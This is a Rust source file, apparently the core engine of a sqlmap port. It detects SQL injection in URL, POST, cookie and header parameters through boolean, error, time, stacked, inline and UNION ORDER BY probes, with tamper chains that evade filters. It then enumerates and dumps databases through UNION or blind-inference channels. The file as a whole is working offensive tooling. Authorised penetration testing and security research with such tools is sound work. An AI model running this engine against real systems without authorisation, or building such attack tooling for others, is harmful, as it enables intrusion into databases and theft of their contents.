//! The scanning engine itself.

use sqlmap_core::config::{Config, Place, Technique};
use sqlmap_core::injection::{Boundary, Injection};
use sqlmap_core::kb::KnowledgeBase;
use sqlmap_http::client::{Client, RequestSpec, Response};
use sqlmap_http::comparison::{filtered_page, ratio};
use sqlmap_http::params::{self, Param};
use sqlmap_payloads as pl;
use std::time::Duration;

/// Outcome of a full scan: findings plus a human-readable decision log
/// (sqlmap writes this to the console; we return it for the CLI to print).
pub struct ScanResult {
    pub kb: KnowledgeBase,
    pub log: Vec<String>,
}

pub struct Engine<'a> {
    client: &'a Client,
    conf: &'a Config,
    log: Vec<String>,
    kb: KnowledgeBase,
}

fn rand_num(seed: u64) -> u32 {
    // Deterministic pseudo-random like sqlmap's randomInt; seeded per request.
    let mut x = seed.max(1);
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    (x % 90000 + 10000) as u32
}

fn rand_str(seed: u64) -> String {
    let mut x = seed.max(1);
    let mut s = String::new();
    for _ in 0..6 {
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        s.push((b'a' + (x % 26) as u8) as char);
    }
    s
}

impl<'a> Engine<'a> {
    pub fn new(client: &'a Client, conf: &'a Config) -> Self {
        Self {
            client,
            conf,
            log: Vec::new(),
            kb: KnowledgeBase::default(),
        }
    }

    fn say(&mut self, msg: impl Into<String>) {
        self.log.push(msg.into());
    }

    /// Build the request for `param` carrying `new_value` (port of the request
    /// assembly in sqlmap `agent.payload` + `connect.getPage`).
    fn build_request(&self, param: &Param, new_value: &str) -> RequestSpec {
        build_request(self.conf, param, new_value)
    }

    fn fetch(&self, spec: &RequestSpec) -> Result<Response, String> {
        self.client.request(spec)
    }

    /// Full scan over all testable parameters (port of `start()`'s per-param loop).
    pub fn scan(mut self) -> ScanResult {
        let mut all = params::extract_params(
            &self.conf.target_url,
            self.conf.data.as_deref(),
            self.conf.cookie.as_deref(),
        );
        if let Some(only) = &self.conf.test_param {
            all.retain(|p| p.name == *only);
        }
        if let Some(skip) = &self.conf.skip_param {
            all.retain(|p| p.name != *skip);
        }
        // sqlmap level >= 3 adds User-Agent and Referer as injection places.
        if self.conf.level >= 3 {
            all.push(Param {
                place: Place::UserAgent,
                name: "User-Agent".into(),
                value: self.conf.user_agent.clone().unwrap_or_else(|| "sqlmap-rs".into()),
            });
            all.push(Param {
                place: Place::Referer,
                name: "Referer".into(),
                value: self.conf.target_url.clone(),
            });
        }
        if all.is_empty() {
            self.say("no testable parameters found in URL/POST data/cookie".to_string());
            return ScanResult { kb: self.kb, log: self.log };
        }
        self.say(format!("testing {} parameter(s)", all.len()));

        for param in all.clone() {
            if self.kb.tested_params.contains(&param.name) {
                continue;
            }
            self.scan_param(&param);
            self.kb.tested_params.push(param.name.clone());
        }
        if self.conf.wants_enumeration() {
            self.run_enumeration();
        }
        ScanResult { kb: self.kb, log: self.log }
    }

    /// --dbs/--tables/--columns/--dump via the channel of a confirmed
    /// injection (sqlmap `enumeration` phase): UNION echo when available,
    /// otherwise blind inference - page-based for boolean findings, the
    /// conditional-SLEEP vector for time/stacked/inline findings.
    fn run_enumeration(&mut self) {
        // Prefer the UNION channel when a union finding carries a column count
        // (one request per value); fall back to blind inference.
        let union_inj = self
            .kb
            .injections
            .iter()
            .find(|i| i.technique == Technique::Union && i.column_count.is_some())
            .cloned();
        let blind_inj = self
            .kb
            .injections
            .iter()
            .find(|i| matches!(i.technique, Technique::Boolean | Technique::Time | Technique::Stacked | Technique::Inline))
            .cloned();
        let Some((inj, via_union)) = union_inj.map(|i| (i, true)).or_else(|| blind_inj.map(|i| (i, false)))
        else {
            self.say("enumeration skipped: needs an injectable parameter; none found".to_string());
            return;
        };
        let all = params::extract_params(
            &self.conf.target_url,
            self.conf.data.as_deref(),
            self.conf.cookie.as_deref(),
        );
        let Some(param) = all
            .into_iter()
            .find(|p| p.name == inj.parameter && p.place == inj.place)
        else {
            self.say(format!(
                "enumeration skipped: cannot rebuild parameter '{}' ({:?})",
                inj.parameter, inj.place
            ));
            return;
        };
        if via_union {
            self.say(format!(
                "enumerating via UNION channel on '{}' ({:?})",
                param.name, param.place
            ));
            let mut ext = crate::exfil::UnionExtractor::new(self.client, self.conf, param, inj)
                .expect("union finding carries a column count");
            let results = ext.run();
            self.log.extend(ext.log);
            self.kb.enumeration = results;
        } else {
            self.say(format!(
                "enumerating via blind inference on '{}' ({:?})",
                param.name, param.place
            ));
            let orig = match self.fetch(&self.build_request(&param, &param.value)) {
                Ok(r) => r,
                Err(e) => {
                    self.say(format!("enumeration aborted: baseline refetch failed: {e}"));
                    return;
                }
            };
            let signal = crate::exfil::infer_signal(inj.technique);
            let mut ext = crate::exfil::BlindExtractor::new(
                self.client,
                self.conf,
                param,
                inj,
                filtered_page(&orig.body),
                self.conf.page_ratio_threshold,
                signal,
            );
            let results = ext.run();
            self.log.extend(ext.log);
            self.kb.enumeration = results;
        }
    }

    fn scan_param(&mut self, param: &Param) {
        self.say(format!("testing '{}' ({:?})", param.name, param.place));

        // Original page (baseline) - sqlmap `kb.originalPage`.
        let orig = match self.fetch(&self.build_request(param, &param.value)) {
            Ok(r) => r,
            Err(e) => {
                self.say(format!("  baseline request failed: {e}"));
                return;
            }
        };
        let orig_page = filtered_page(&orig.body);
        let baseline = orig.elapsed;

        // Fingerprint from any error already on the page.
        if let Some(dbms) = sqlmap_dbms::best_guess(&orig.body) {
            self.say(format!("  original page leaks {dbms} error text"));
            self.kb.fingerprinted_dbms = Some(dbms.to_string());
        }

        // Heuristic check: single quote appended (sqlmap `checkDynParam` +
        // heuristic error scan).
        let probe = format!("{}'", param.value);
        if let Ok(r) = self.fetch(&self.build_request(param, &probe)) {
            if let Some(dbms) = sqlmap_dbms::best_guess(&r.body) {
                self.say(format!("  heuristic: '{dbms}' error triggered by quote probe - parameter looks dynamic"));
                self.kb.fingerprinted_dbms = Some(dbms.to_string());
            }
        }

        let boundaries = pl::boundaries();
        let forced = self.conf.dbms.as_deref().map(|s| s.to_ascii_lowercase());
        let dbms_hint = forced.or_else(|| self.kb.fingerprinted_dbms.clone());

        for tech in self.conf.techniques.clone() {
            match tech {
                Technique::Boolean => self.check_boolean(param, &orig_page, &boundaries, dbms_hint.as_deref()),
                Technique::Error => self.check_error(param, &boundaries, dbms_hint.as_deref()),
                Technique::Time => self.check_time(param, baseline, &boundaries, dbms_hint.as_deref()),
                Technique::Union => self.check_union(param, &orig_page, &boundaries, dbms_hint.as_deref()),
                Technique::Stacked => self.check_delay(
                    param, baseline, &boundaries, dbms_hint.as_deref(),
                    pl::stacked_payloads(), Technique::Stacked, DelayMode::Plain,
                ),
                Technique::Inline => self.check_delay(
                    param, baseline, &boundaries, dbms_hint.as_deref(),
                    pl::inline_payloads(), Technique::Inline, DelayMode::FullReplace,
                ),
            }
        }
    }

    /// Assemble final injected value: origValue + prefix + payload + suffix,
    /// with tamper chain applied (sqlmap `agent.payload` assembly order).
    fn assemble(&mut self, param: &Param, boundary: &Boundary, payload_q: &str, seed: u64) -> String {
        assemble(self.conf, &mut self.log, param, boundary, payload_q, seed)
    }

    fn payload_ok_static(level: u8, risk: u8, p: &pl::Payload, dbms_hint: Option<&str>) -> bool {
        if p.level > level || p.risk > risk {
            return false;
        }
        match (p.dbms, dbms_hint) {
            (Some(tag), Some(hint)) => tag == hint,
            _ => true,
        }
    }

    /// Boolean-based blind (port of the boolean branch of `checkSqlInjection`):
    /// true payload must render the original page; false payload must differ.
    fn check_boolean(&mut self, param: &Param, orig_page: &str, boundaries: &[Boundary], dbms_hint: Option<&str>) {
        if !self.conf.techniques.contains(&Technique::Boolean) {
            return;
        }
        let threshold = self.conf.page_ratio_threshold;
        let (lvl, rsk) = (self.conf.level, self.conf.risk);
        for p in pl::boolean_payloads().into_iter().filter(|p| Self::payload_ok_static(lvl, rsk, p, dbms_hint)) {
            let pl::Check::Boolean { true_q, false_q } = p.check else { continue };
            for (bi, boundary) in boundaries.iter().enumerate() {
                // Numeric-looking values get numeric boundaries first; strings get quotes.
                let numeric_value = param.value.chars().all(|c| c.is_ascii_digit()) && !param.value.is_empty();
                if numeric_value != (boundary.ptype == sqlmap_core::injection::PType::Numeric) && bi < 6 {
                    continue;
                }
                let seed = 1000 + bi as u64;
                let true_val = self.assemble(param, boundary, true_q, seed);
                let true_resp = match self.fetch(&self.build_request(param, &true_val)) {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                let true_ratio = ratio(orig_page, &filtered_page(&true_resp.body));
                if true_ratio < threshold {
                    continue;
                }
                let false_val = self.assemble(param, boundary, false_q, seed);
                let false_resp = match self.fetch(&self.build_request(param, &false_val)) {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                let false_ratio = ratio(&filtered_page(&true_resp.body), &filtered_page(&false_resp.body));
                if false_ratio < threshold {
                    self.say(format!(
                        "  INJECTABLE (boolean): '{}' with {} [{}], true_ratio={true_ratio:.3} false_ratio={false_ratio:.3}",
                        param.name, p.title, boundary.prefix
                    ));
                    self.kb.add_injection(Injection {
                        place: param.place,
                        parameter: param.name.clone(),
                        technique: Technique::Boolean,
                        boundary: boundary.clone(),
                        payload: true_val,
                        dbms: dbms_hint.map(|s| s.to_string()),
                        note: format!("true page matches original (r={true_ratio:.3}), false page differs (r={false_ratio:.3})"),
                        column_count: None,
                    });
                    return;
                }
            }
        }
    }

    /// Error-based (port of `checkErrorBased`): the payload embeds a marker the
    /// DBMS must echo inside its own error message.
    fn check_error(&mut self, param: &Param, boundaries: &[Boundary], dbms_hint: Option<&str>) {
        let (lvl, rsk) = (self.conf.level, self.conf.risk);
        for p in pl::error_payloads().into_iter().filter(|p| Self::payload_ok_static(lvl, rsk, p, dbms_hint)) {
            let pl::Check::Error { q } = p.check else { continue };
            for (bi, boundary) in boundaries.iter().enumerate() {
                let numeric_value = param.value.chars().all(|c| c.is_ascii_digit()) && !param.value.is_empty();
                if numeric_value != (boundary.ptype == sqlmap_core::injection::PType::Numeric) && bi < 6 {
                    continue;
                }
                let seed = 5000 + bi as u64;
                let val = self.assemble(param, boundary, q, seed);
                let marker = rand_str(seed.wrapping_mul(13).wrapping_add(3));
                let resp = match self.fetch(&self.build_request(param, &val)) {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                if let Some(dbms) = sqlmap_dbms::error_contains_marker(&resp.body, &marker) {
                    self.say(format!(
                        "  INJECTABLE (error-based): '{}' with {} - {dbms} error echoed marker",
                        param.name, p.title
                    ));
                    self.kb.fingerprinted_dbms = Some(dbms.to_string());
                    self.kb.add_injection(Injection {
                        place: param.place,
                        parameter: param.name.clone(),
                        technique: Technique::Error,
                        boundary: boundary.clone(),
                        payload: val,
                        dbms: Some(dbms.to_string()),
                        note: format!("{dbms} error contained payload marker '{marker}'"),
                        column_count: None,
                    });
                    return;
                }
            }
        }
    }

    /// UNION-based, partial port: column-count discovery via ORDER BY probing
    /// (the first half of sqlmap `unionTest`). Data exfiltration through UNION
    /// SELECT is NOT ported; the finding records the column count only.
    fn check_union(&mut self, param: &Param, orig_page: &str, boundaries: &[Boundary], dbms_hint: Option<&str>) {
        let threshold = self.conf.page_ratio_threshold;
        let comment_bounds: Vec<&Boundary> = boundaries
            .iter()
            .filter(|b| b.suffix.starts_with("--"))
            .collect();
        for boundary in comment_bounds {
            let numeric_value = param.value.chars().all(|c| c.is_ascii_digit()) && !param.value.is_empty();
            if numeric_value != (boundary.ptype == sqlmap_core::injection::PType::Numeric) {
                continue;
            }
            let mut last_ok = 0u32;
            let mut last_val = String::new();
            let mut broke_at: Option<u32> = None;
            for n in 1..=10u32 {
                let q = format!(" ORDER BY {n}");
                let val = self.assemble(param, boundary, &q, 7000 + n as u64);
                let resp = match self.fetch(&self.build_request(param, &val)) {
                    Ok(r) => r,
                    Err(_) => break,
                };
                if ratio(orig_page, &filtered_page(&resp.body)) >= threshold {
                    last_ok = n;
                    last_val = val;
                } else {
                    broke_at = Some(n);
                    break;
                }
            }
            // Need: n=1 similar (param accepts ORDER BY) and a clean break point.
            match (last_ok, broke_at) {
                (0, _) | (_, None) => continue, // n=1 already differed, or no break up to cap: not conclusive
                (count, Some(_)) => {
                    self.say(format!(
                        "  INJECTABLE (union, partial): '{}' - column count = {count} via ORDER BY probing",
                        param.name
                    ));
                    self.kb.add_injection(Injection {
                        place: param.place,
                        parameter: param.name.clone(),
                        technique: Technique::Union,
                        boundary: boundary.clone(),
                        payload: last_val,
                        dbms: dbms_hint.map(|s| s.to_string()),
                        note: format!("column count = {count} (ORDER BY probing)"),
                        column_count: Some(count),
                    });
                    return;
                }
            }
        }
    }

    /// Time-based blind (port of the time branch of `checkSqlInjection`):
    /// response must be delayed by ~time_sec, confirmed on a second request.
    fn check_time(&mut self, param: &Param, baseline: Duration, boundaries: &[Boundary], dbms_hint: Option<&str>) {
        self.check_delay(
            param, baseline, boundaries, dbms_hint,
            pl::time_payloads(), Technique::Time, DelayMode::Boundary,
        );
    }

    /// Shared delay-confirmed check behind techniques T, S and Q (sqlmap
    /// confirms stacked and inline queries by time delay too, repeating the
    /// request once to rule out network jitter).
    fn check_delay(
        &mut self,
        param: &Param,
        baseline: Duration,
        boundaries: &[Boundary],
        dbms_hint: Option<&str>,
        payloads: Vec<pl::Payload>,
        technique: Technique,
        mode: DelayMode,
    ) {
        let need = Duration::from_secs(self.conf.time_sec as u64);
        let (lvl, rsk) = (self.conf.level, self.conf.risk);
        for p in payloads.into_iter().filter(|p| Self::payload_ok_static(lvl, rsk, p, dbms_hint)) {
            let pl::Check::Time { q } = p.check else { continue };
            // Stacked fragments carry their own quote closing; inline queries
            // replace the value outright. Only classic time payloads iterate
            // the boundary list.
            let iter: Vec<(usize, &Boundary)> = match mode {
                DelayMode::Boundary => boundaries.iter().enumerate().collect(),
                _ => boundaries[..1].iter().enumerate().collect(),
            };
            for (bi, boundary) in iter {
                if matches!(mode, DelayMode::Boundary) {
                    let numeric_value = param.value.chars().all(|c| c.is_ascii_digit()) && !param.value.is_empty();
                    if numeric_value != (boundary.ptype == sqlmap_core::injection::PType::Numeric) && bi < 6 {
                        continue;
                    }
                }
                let seed = 9000 + bi as u64 + match technique {
                    Technique::Stacked => 100,
                    Technique::Inline => 200,
                    _ => 0,
                };
                let val = match mode {
                    DelayMode::FullReplace => assemble_full(self.conf, &mut self.log, q, seed),
                    _ => self.assemble(param, boundary, q, seed),
                };
                let first = match self.fetch(&self.build_request(param, &val)) {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                if first.elapsed < need {
                    continue;
                }
                // Confirm once more (sqlmap repeats to rule out network jitter).
                let second = match self.fetch(&self.build_request(param, &val)) {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                if second.elapsed >= need {
                    self.say(format!(
                        "  INJECTABLE ({technique:?}): '{}' with {} - {:.1?}/{:.1?} vs baseline {:.1?}",
                        param.name, p.title, first.elapsed, second.elapsed, baseline
                    ));
                    self.kb.add_injection(Injection {
                        place: param.place,
                        parameter: param.name.clone(),
                        technique,
                        boundary: boundary.clone(),
                        payload: val,
                        dbms: dbms_hint.map(|s| s.to_string()),
                        note: format!("two delayed responses >= {}s (baseline {:.2?})", self.conf.time_sec, baseline),
                        column_count: None,
                    });
                    return;
                }
            }
        }
    }
}

pub(crate) fn build_request(conf: &Config, param: &Param, new_value: &str) -> RequestSpec {
        let (base, _) = params::split_url(&conf.target_url);
        match param.place {
            Place::Get => {
                let query_raw = conf
                    .target_url
                    .split_once('?')
                    .map(|(_, q)| q)
                    .unwrap_or("");
                let query = params::mutate(Place::Get, query_raw, &param.name, new_value);
                RequestSpec {
                    url: format!("{base}?{query}"),
                    method: "GET".into(),
                    body: conf.data.clone(),
                    headers: tampered_headers(conf, new_value),
                    cookie: conf.cookie.clone(),
                }
            }
            Place::Post => {
                let body = params::mutate(
                    Place::Post,
                    conf.data.as_deref().unwrap_or(""),
                    &param.name,
                    new_value,
                );
                RequestSpec {
                    url: conf.target_url.clone(),
                    method: "POST".into(),
                    body: Some(body),
                    headers: tampered_headers(conf, new_value),
                    cookie: conf.cookie.clone(),
                }
            }
            Place::Cookie => {
                let cookie = params::mutate(
                    Place::Cookie,
                    conf.cookie.as_deref().unwrap_or(""),
                    &param.name,
                    new_value,
                );
                RequestSpec {
                    url: conf.target_url.clone(),
                    method: if conf.data.is_some() { "POST".into() } else { "GET".into() },
                    body: conf.data.clone(),
                    headers: tampered_headers(conf, new_value),
                    cookie: Some(cookie),
                }
            }
            Place::UserAgent | Place::Referer | Place::CustomHeader => {
                let mut headers = tampered_headers(conf, new_value);
                headers.retain(|(k, _)| !k.eq_ignore_ascii_case(&param.name));
                headers.push((param.name.clone(), new_value.to_string()));
                RequestSpec {
                    url: conf.target_url.clone(),
                    method: if conf.data.is_some() { "POST".into() } else { "GET".into() },
                    body: conf.data.clone(),
                    headers,
                    cookie: conf.cookie.clone(),
                }
            }
        }
    }

/// How a delay-confirmed payload is placed into the parameter value.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DelayMode {
    /// Classic time-based blind: payload sits inside boundary prefix/suffix
    /// pairs (technique T).
    Boundary,
    /// Stacked queries: the fragment closes any quoting itself; only the
    /// plain (empty) boundary is used (technique S).
    Plain,
    /// Inline queries: the payload REPLACES the parameter value (technique Q).
    FullReplace,
}

/// Assemble an inline-query value: the rendered payload is the whole value
/// (sqlmap inline_query.xml semantics), then the tamper chain.
pub(crate) fn assemble_full(conf: &Config, log: &mut Vec<String>, payload_q: &str, seed: u64) -> String {
    let rn = rand_num(seed);
    let rn1 = rand_num(seed.wrapping_mul(7).wrapping_add(1));
    let rs = rand_str(seed.wrapping_mul(13).wrapping_add(3));
    let mut joined = pl::render(payload_q, conf.time_sec, rn, rn1, &rs);
    if !conf.tampers.is_empty() {
        match sqlmap_tamper::apply_all(&conf.tampers, &joined, seed) {
            Ok(t) => joined = t,
            Err(e) => log.push(format!("  tamper error: {e}")),
        }
    }
    joined
}

pub(crate) fn assemble(conf: &Config, log: &mut Vec<String>, param: &Param, boundary: &Boundary, payload_q: &str, seed: u64) -> String {
        let rn = rand_num(seed);
        let rn1 = rand_num(seed.wrapping_mul(7).wrapping_add(1));
        let rs = rand_str(seed.wrapping_mul(13).wrapping_add(3));
        let rendered = pl::render(payload_q, conf.time_sec, rn, rn1, &rs);
        let suffix = boundary
            .suffix
            .replace("[RANDSTR]", &rs)
            .replace("[RANDNUM]", &rn.to_string());
        let prefix = boundary.prefix.clone();
        let mut joined = format!("{}{}{}{}", param.value, prefix, rendered, suffix);
        if !conf.tampers.is_empty() {
            match sqlmap_tamper::apply_all(&conf.tampers, &joined, seed) {
                Ok(t) => joined = t,
                Err(e) => log.push(format!("  tamper error: {e}")),
            }
        }
        joined
    }

/// Request headers: explicit --headers plus payload-embedding tamper
/// headers (upstream referer.py sets Referer to the payload itself).
fn tampered_headers(conf: &Config, new_value: &str) -> Vec<(String, String)> {
    let mut headers = parse_headers(&conf.headers);
    headers.extend(sqlmap_tamper::payload_header_mutations(&conf.tampers, new_value));
    headers
}

fn parse_headers(raw: &[String]) -> Vec<(String, String)> {
    raw.iter()
        .filter_map(|h| {
            h.split_once(':')
                .map(|(k, v)| (k.trim().to_string(), v.trim().to_string()))
        })
        .collect()
}
